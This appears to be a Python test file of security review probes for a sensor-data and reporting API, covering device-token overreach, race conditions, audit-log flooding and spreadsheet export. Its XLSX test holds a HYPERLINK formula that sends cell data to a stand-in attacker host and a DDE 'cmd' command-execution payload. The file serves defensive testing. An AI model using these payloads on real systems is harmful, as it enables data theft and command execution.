"""Scratch review probes (ctx fixture, no S3)."""

from __future__ import annotations

from datetime import UTC, datetime

from sqlalchemy import text

from app.seed import DEV_A_COLLECTOR, ORG_A, SES_A, fid


def _device_headers(ctx) -> dict[str, str]:
    code = ctx.client.post(f"/v1/devices/{DEV_A_COLLECTOR}/enrollment-codes",
                           headers=ctx.as_user(101, mfa=True)).json()["code"]
    cred = ctx.client.post("/v1/agents/enroll", json={"enrollment_code": code, "agent_version": "0.1.0",
                                                      "os": "linux"}).json()
    tok = ctx.client.post("/v1/auth/token", data={"grant_type": "client_credentials", "client_id": cred["client_id"],
                                                  "client_secret": cred["client_secret"]}).json()["access_token"]
    return {"Authorization": f"Bearer {tok}"}


def test_rv_device_token_overreach(ctx) -> None:
    member = ctx.as_user(102)
    rep = ctx.client.post("/v1/reports", json={"template_code": "EXAMPLE_SESSION_LOG", "session_id": SES_A},
                          headers=member)
    assert rep.status_code == 201, rep.text
    rid = rep.json()["report_id"]
    # a SOURCE device of org A that is NOT mapped to the collector, with observations posted by a member
    admin = ctx.as_user(101)
    dev = ctx.client.post("/v1/devices", json={"name": "unmapped buoy", "kind": "SOURCE", "device_type": "SENSOR",
                                               "local_copy_policy": "RETAINED"}, headers=admin)
    assert dev.status_code == 201, dev.text
    other = dev.json()["device_id"]
    obs = {"schema_version": "1.0.0", "source_system_id": other, "observations": [
        {"metric": "sea_water_temperature", "observed_at": "2026-11-02T00:00:00Z", "value": 18.2, "unit": "degC",
         "quality_flag": "GOOD"}]}
    assert ctx.client.post("/v1/observations", json=obs, headers=member).status_code == 200

    dh = _device_headers(ctx)
    print("device: GET /v1/reports ->", (r := ctx.client.get("/v1/reports", headers=dh)).status_code,
          [(i["report_id"] == rid, i["status"]) for i in r.json().get("items", [])])
    print("device: GET /v1/reports/{id} ->", ctx.client.get(f"/v1/reports/{rid}", headers=dh).status_code)
    w = ctx.client.post(f"/v1/sessions/{SES_A}/records",
                        json={"kind": "TEST", "title": "forged by device", "result": "PASS"}, headers=dh)
    print("device: POST session record ->", w.status_code)
    print("device: GET /v1/sessions/{id}/records ->",
          ctx.client.get(f"/v1/sessions/{SES_A}/records", headers=dh).status_code)
    q = {"source_system_id": other, "from": "2026-11-01T00:00:00Z", "to": "2026-11-03T00:00:00Z"}
    o = ctx.client.get("/v1/observations", params=q, headers=dh)
    print("device: GET observations of UNMAPPED source ->", o.status_code, len(o.json().get("items", [])))
    print("device: GET /v1/usage ->", ctx.client.get("/v1/usage", headers=dh).status_code)
    print("device: GET /v1/incidents ->", ctx.client.get("/v1/incidents", headers=dh).status_code)
    print("device: GET /v1/events ->", ctx.client.get("/v1/events", headers=dh).status_code)
    # human_verified=true on creation by a machine principal
    ev = ctx.client.post("/v1/events", json={
        "schema_version": "1.0.0", "session_id": SES_A, "event_code": "VESSEL",
        "started_at": "2026-11-02T00:00:00Z", "timestamp_quality": {"source": "DEVICE", "verified": True},
        "source": "MANUAL", "human_verified": True, "source_system_id": "dev_00000000000000000000000302"},
        headers=dh)
    print("device: POST event MANUAL human_verified=true ->", ev.status_code, ev.text[:200] if ev.status_code >= 400 else "",
          {k: ev.json().get(k) for k in ("human_verified", "verified_by")})


def test_rv_observation_root_errors_suppressed(ctx) -> None:
    member = ctx.as_user(102)
    body = {"schema_version": "1.0.0", "observations": [
        {"metric": "sea_water_temperature", "observed_at": "2026-11-02T00:00:00Z", "value": 1.0, "unit": "zzz",
         "quality_flag": "GOOD"}]}
    r = ctx.client.post("/v1/observations", json=body, headers=member)
    print("missing source_system_id + unknown unit ->", r.status_code, r.json().get("code"))
    body2 = {**body, "observations": [{**body["observations"][0], "unit": "degC"}]}
    r2 = ctx.client.post("/v1/observations", json=body2, headers=member)
    print("missing source_system_id + known unit ->", r2.status_code, r2.json().get("code"))


def test_rv_commit_after_response(ctx, monkeypatch) -> None:
    """A concurrent same-key request that commits first makes this request's COMMIT fail — after the 201 was sent."""
    import app.api.observations as obs_api

    member = ctx.as_user(102)
    key = "agent-evt-0001"
    real_view = obs_api.event_view

    def view_and_race(db, e):  # type: ignore[no-untyped-def]
        with ctx.c.engine.begin() as conn:  # the other request's idempotency row commits here
            conn.execute(text("INSERT INTO idempotency_keys (organization_id, principal_id, method_path, key, "
                              "body_hash, status_code, response_body, created_at, expires_at) VALUES "
                              "(:o, :p, 'POST /v1/events', :k, 'x', 201, '{}'::jsonb, now(), now() + interval '1 day')"),
                         {"o": ORG_A, "p": fid("usr", 102), "k": key})
        return real_view(db, e)

    monkeypatch.setattr(obs_api, "event_view", view_and_race)
    r = ctx.client.post("/v1/events", json={
        "schema_version": "1.0.0", "session_id": SES_A, "event_code": "VESSEL", "started_at": "2026-11-02T00:00:00Z",
        "timestamp_quality": {"source": "DEVICE", "verified": True}, "source": "MANUAL"},
        headers={**member, "Idempotency-Key": key})
    monkeypatch.setattr(obs_api, "event_view", real_view)
    print("POST /v1/events ->", r.status_code, r.json().get("event_id"))
    g = ctx.client.get(f"/v1/events/{r.json().get('event_id')}", headers=member)
    print("GET that event ->", g.status_code)


def test_rv_xlsx_formula_injection() -> None:
    import io

    from openpyxl import load_workbook

    from app.adapters import report_renderers as rr

    doc = {"title": "=HYPERLINK(\"http://attacker.invalid/?x=\"&B5,\"open\")", "status_label": "제출본", "version": 1,
           "generated_at": "x", "data_as_of": "y", "damage_note": None, "variables": {},
           "sections": [{"kind": "FIELDS", "title": "f", "fields": [
               {"key": "summary", "label": "요약", "value": "=1+cmd|' /C calc'!A0", "auto_value": "a",
                "edited": True}]}]}
    wb = load_workbook(io.BytesIO(rr.render_xlsx(doc)))
    ws = wb["보고서"]
    print("A1:", ws["A1"].data_type, repr(ws["A1"].value)[:60])
    for row in ws.iter_rows():
        for cell in row:
            if cell.data_type == "f":
                print("formula cell", cell.coordinate, repr(cell.value)[:60])
    _ = datetime.now(UTC)


def test_rv_unauthenticated_audit_amplification(ctx) -> None:
    def count() -> tuple[int, int]:
        with ctx.c.engine.connect() as conn:
            n = conn.execute(text("SELECT count(*), coalesce(max(length(details::text)), 0) FROM audit_log")).one()
            return int(n[0]), int(n[1])

    before = count()
    for i in range(20):
        r = ctx.client.get("/v1/assets/" + ("A" * 8000) + str(i))  # no Authorization header at all
    after = count()
    print("401 status:", r.status_code, "audit rows +", after[0] - before[0], "max details length:", after[1])
    from app.api import auth as auth_api

    keys_before = len(auth_api._auth_limiter.hits)
    for i in range(200):
        ctx.client.post("/v1/auth/token", data={"grant_type": "client_credentials", "client_id": f"x{i:0120d}",
                                                "client_secret": "nope"})
    print("token attempts: limiter keys +", len(auth_api._auth_limiter.hits) - keys_before,
          "audit rows +", count()[0] - after[0])
